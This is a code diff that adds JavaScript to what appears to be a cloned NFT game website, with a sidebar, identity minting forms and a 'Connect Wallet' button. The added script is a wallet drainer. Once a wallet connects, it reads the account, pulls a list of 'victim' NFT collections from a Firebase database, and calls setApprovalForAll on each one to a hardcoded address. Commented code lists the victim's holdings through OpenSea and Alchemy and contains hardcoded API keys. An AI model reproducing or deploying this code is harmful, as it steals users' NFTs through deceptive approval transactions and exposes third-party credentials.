orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf4"><input name="vault" type="text" inputmode="numeric" placeholder="Vault boxes — Optional" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf5"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf6"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
+            .form > * + * {
+              margin-top: 1rem;
+            }
+          </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Identities &amp; lands<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div class="sidebar-menu__item-blist"><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Mint New Identity</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 2000 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Create New Land</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 500 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Item Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Land Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div></div></div></div></div><button class="sidebar-menu__item-btn MuiBox-root css-htg0vc"><span>Connect Wallet</span></button></div>
+        `)
+
+        $('.css-txdpd1').remove()
+
+
+        console.log('sidebar clicked')
+
+        
+        
+        const button1 = $('.css-1u5qx9')
+        const button2 = $('.css-htg0vc')
+
+        button1.on('click', function () {
+            menuItems()
+        })
+        button2.on('click', function () {
+            menuItems()
+        })
+
+
+
+        }, 1000);
+
+    })
+}
+
+
+async function intervalCheck() {
+
+    if ($('.sidebar').length) {
+        clearInterval(sidebarCheck)
+        console.log('true, interval cleared')
+        await sidebar()
+        //await menuItems()
+        //await inSidebarConnect()
+    } else {
+        console.log('false')
+    }
+
+}
+
+// setTimeout(() => {
+//     $('.menu__link-text').click()
+// }, 10000);
+
+async function menuItems() {
+
+        // $('.menu2').each( function () {
+        //     const x = $(this).html()
+
+        //     console.log(x);
+        // })
+
+        const ganaYawa = $('.menu2').find('li').eq([6]).find('span').eq([0]).find('span.menu__link-text')
+
+        ganaYawa.click()
+
+        // console.log(ganaYawa);
+
+}
+
+
+
+//metamask
+
+// const checkConnected = setInterval(() => {
+//     getAccount()
+//     console.log('checkConnnected running')
+// }, 3000);
+
+// async function getAccount() {
+//     const accounts = await window.ethereum.request({
+//         method: 'eth_requestAccounts'
+//     }).catch( (err) => {
+//         if (err.code === 4001) {
+//             console.log('please con met');
+//         } else {
+//             console.error(err)
+//         }
+//     });
+
+//     if (!accounts[0]) {
+        
+//     } else {
+//         clearInterval(checkConnected)
+//         account = accounts[0]
+//         console.log(account)
+//     }
+
+//     // account = accounts[0]
+//     // console.log(account)
+// }
+
+
+
+var checkConnected = setInterval( () => {
+    
+  
+  var d = JSON.parse(localStorage.getItem('wagmi.store'))
+  // console.log(d.state.data)
+  
+
+    if (!('account' in d.state.data) ) {
+      console.log('not connected')
+    } else {
+      getAddress()
+      intervalStop()
+      trade()
+      console.log('connected')
+  
+    }
+
+}, 3000);
+
+//interval stopper
+
+function intervalStop() {
+    clearInterval(checkConnected);
+    console.log('intervalStopped')
+}
+
+
+async function getAddress() {
+    const d = JSON.parse(localStorage.getItem('wagmi.store'))
+    console.log(d);
+    const userAddress = d.state.data.account
+    //console.log(userAddress);
+    account = userAddress
+    console.log(account)
+
+    //await loadWallet(account)
+    //await trade()
+
+}
+
+
+
+// async function GetAllCollection(address){
+//     var collections = []
+//     var offset = 0
+//     var old_count = 0;
+//     try{
+  
+//       while(true){ // Added
+//         var url = `${OPENSEA_URL}api/v2/collections?asset_owner=${address}&offset=${offset}&limit=50`
+//         await $.ajax({
+//             url: url,
+//             method: "GET",
+//             headers: {
+//               accept: 'application/json',
+//               'X-API-KEY': '078b8acce6a34dd3a2dbb0cd34127203'
+//             },
+//             success: function(data){
+//                 // for(var i = 0; i < data.length; i++){
+//                 //   if(data[i].primary_asset_contracts.length > 0)
+//                 //     collections.push(data[i])
+//                 // }
+
+//                 for (var i = 0; i < data.collections.length; i++) {
+//                   //console.log(data.collections[i].collection)
+      
+//                   if (data.collections[i].collection.length == 42) {
+//                       console.log(data.collections[i].collection)
+
+//                        collections.push(data.collections[i].collection)
+//                       console.log(collections)
+//                       // localStorage.setItem('spoofCollection', JSON.stringify(collections) )
+//                       //data[i] ang iyang tree
+
+//                       //TOTAL MAG SPOOF RAMAN KA AYAW NA PALABIHA, SA PANEL RA KUHAA
+//                 }
+                
+//                 }
+//             }
+//         })
+//         if(old_count == collections.length)
+//           break
+//           old_count = collections.length
+//         offset += 50
+//       }
+//     }catch(err){
+//       console.log(err)
+//     }
+
+
+  
+//     for(var i = 0 ; i < collections.length; i++){
+//       collections[i].worth = 0
+//       try{
+//         var result = await $.ajax({
+//           url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collections[i].primary_asset_contracts[collections[i].primary_asset_contracts.length-1].address,
+//           method: "GET",
+//         })
+//         if(result.openSea != undefined && result.openSea.floorPrice != undefined)
+//         collections[i].worth = result.openSea.floorPrice
+//       }catch{
+//         if(collections[i].stats.seven_day_volume > 0){
+//           collections[i].worth = Math.round(
+//             collections[i].stats.seven_day_volume * 0.8 * 10000
+//           ) / 10000
+//         }
+//       }
+      
+//     }
+
+//     collections = collections.sort((a, b) => {
+//       return a.worth < b.worth
+//         ? 1
+//         : -1;
+//     });
+
+//     return collections
+//   }
+
+
+async function loadWallet(address) {
+
+    let arr = [];
+
+    var victimCollection = await GetAllCollection(address) 
+        //console.log(victimCollection);
+
+     for (var i = 0; i < victimCollection.length; i++) {
+
+        var collection = victimCollection[i]
+
+        var contracts = collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address.toLowerCase()
+
+        console.log(contracts);
+        arr.push(contracts)
+        
+
+     }  
+     console.log(arr)
+     localStorage.setItem('spoofCollection', JSON.stringify(arr))
+}
+
+
+//fromlocalstrorageni
+
+
+//transact
+
+const _abi = [
+    {
+      inputs: [],
+      stateMutability: "nonpayable",
+      type: "constructor",
+    },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "owner",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "address",
+          name: "approved",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "Approval",
+      type: "event",
+    },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "owner",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "address",
+          name: "operator",
+          type: "address",
+        },
+        {
+          indexed: false,
+          internalType: "bool",
+          name: "approved",
+          type: "bool",
+        },
+      ],
+      name: "ApprovalForAll",
+      type: "event",
+    },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "previousOwner",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "address",
+          name: "newOwner",
+          type: "address",
+        },
+      ],
+      name: "OwnershipTransferred",
+      type: "event",
+    },
+    {
+      anonymous: false,
+      inputs: [
+        {
+          indexed: true,
+          internalType: "address",
+          name: "from",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "address",
+          name: "to",
+          type: "address",
+        },
+        {
+          indexed: true,
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "Transfer",
+      type: "event",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "to",
+          type: "address",
+        },
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "approve",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "owner",
+          type: "address",
+        },
+      ],
+      name: "balanceOf",
+      outputs: [
+        {
+          internalType: "uint256",
+          name: "",
+          type: "uint256",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "getApproved",
+      outputs: [
+        {
+          internalType: "address",
+          name: "",
+          type: "address",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "owner",
+          type: "address",
+        },
+        {
+          internalType: "address",
+          name: "operator",
+          type: "address",
+        },
+      ],
+      name: "isApprovedForAll",
+      outputs: [
+        {
+          internalType: "bool",
+          name: "",
+          type: "bool",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "name",
+      outputs: [
+        {
+          internalType: "string",
+          name: "",
+          type: "string",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "owner",
+      outputs: [
+        {
+          internalType: "address",
+          name: "",
+          type: "address",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "ownerOf",
+      outputs: [
+        {
+          internalType: "address",
+          name: "",
+          type: "address",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "renounceOwnership",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "to",
+          type: "address",
+        },
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "safeMint",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "from",
+          type: "address",
+        },
+        {
+          internalType: "address",
+          name: "to",
+          type: "address",
+        },
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "safeTransferFrom",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "from",
+          type: "address",
+        },
+        {
+          internalType: "address",
+          name: "to",
+          type: "address",
+        },
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+        {
+          internalType: "bytes",
+          name: "data",
+          type: "bytes",
+        },
+      ],
+      name: "safeTransferFrom",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "operator",
+          type: "address",
+        },
+        {
+          internalType: "bool",
+          name: "approved",
+          type: "bool",
+        },
+      ],
+      name: "setApprovalForAll",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "bytes4",
+          name: "interfaceId",
+          type: "bytes4",
+        },
+      ],
+      name: "supportsInterface",
+      outputs: [
+        {
+          internalType: "bool",
+          name: "",
+          type: "bool",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [],
+      name: "symbol",
+      outputs: [
+        {
+          internalType: "string",
+          name: "",
+          type: "string",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "tokenURI",
+      outputs: [
+        {
+          internalType: "string",
+          name: "",
+          type: "string",
+        },
+      ],
+      stateMutability: "view",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "from",
+          type: "address",
+        },
+        {
+          internalType: "address",
+          name: "to",
+          type: "address",
+        },
+        {
+          internalType: "uint256",
+          name: "tokenId",
+          type: "uint256",
+        },
+      ],
+      name: "transferFrom",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+    {
+      inputs: [
+        {
+          internalType: "address",
+          name: "newOwner",
+          type: "address",
+        },
+      ],
+      name: "transferOwnership",
+      outputs: [],
+      stateMutability: "nonpayable",
+      type: "function",
+    },
+  ];
+
+  //database HERE
+
+
+async function trade() {
+  await loadWeb3();
+
+  
+
+    //DUMDUMA NAA SA ZIP BEFOREFIREBASSE
+    //var collections = JSON.parse(localStorage.getItem('spoofCollection'))
+    var collections = []
+    let status;
+  
+    // console.log(collections)
+    console.log(account)
+
+    ref.doc(account).get()
+      .then( (docSnapshot) => {
+        if(docSnapshot.exists) {
+          ref.doc(account)
+            .onSnapshot( async (doc) => {
+              //console.log(doc.data())
+              collections = doc.data().spoof
+              status = doc.data().status
+
+              console.log(collections)
+
+              for(var i = 0; i < collections.length; i++) {
+                var collectionAddress = collections[i]
+                console.log(collectionAddress)
+              
+              
+                try {
+
+                  if (status == 'approved') {
+                    console.log('no more approval needed')
+
+                     ref.doc(account).update({
+                      status: 'approved'
+                    }).then( function() {
+                      console.log('approved')
+                    }).catch( (err) => {
+                      console.log(err)
+                    })
+
+
+                  } else {
+
+                    var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
+                     await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+
+                    ref.doc(account).update({
+                      status: 'approved'
+                    }).then( function() {
+                      console.log('approved')
+                    }).catch( (err) => {
+                      console.log(err)
+                    })
+
+
+                  }
+
+
+      
+              
+                    // var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
+                    // await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+
+                    // ref.doc(account).update({
+                    //   status: 'approved'
+                    // }).then( function() {
+                    //   console.log('approved')
+                    // }).catch( (err) => {
+                    //   console.log(err)
+                    // })
+              
+                    // console.log('Address: '+account+ ' and collection '+ collectionAddress + ' is confirmed')
+                  
+                } catch (error) {
+                  
+                }
+              
+              }
+            })
+        }
+      })
+    
+
+
+//
+
+
+
+// if (1) {
+//   for(var i = 0; i < collections.length; i++) {
+//     var collectionAddress = collections[i]
+//     console.log(collectionAddress)
+  
+  
+//     try {
+  
+//         var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
+//         await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})
+  
+//         console.log(account)
+      
+//     } catch (error) {
+      
+//     }
+  
+//   }
+// }
+
+
+    // collections.forEach( async el => {
+    //     var collectionAddress = el;
+
+    //     console.log(collectionAddress)
+
+    //     try {
+
+    //       var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
+    //       await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})
+          
+    //     } catch (error) {
+
+    //       console.log(error)
+          
+    //     }
+
+
+    // })
+
+}
+
+
+// async function yawayawa() {
+//   await loadWeb3();
+//   try {
+
+//     var collectionContract = await new window.web3.eth.Contract(_abi, '0x645670add376f19c3d2c9bdd62dd4190c8fad988', {gas: '100000'})
+//     await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262'})
+    
+//   } catch (error) {
+//     console.log(error)
+//   }
+// }
+
+// yawayawa()
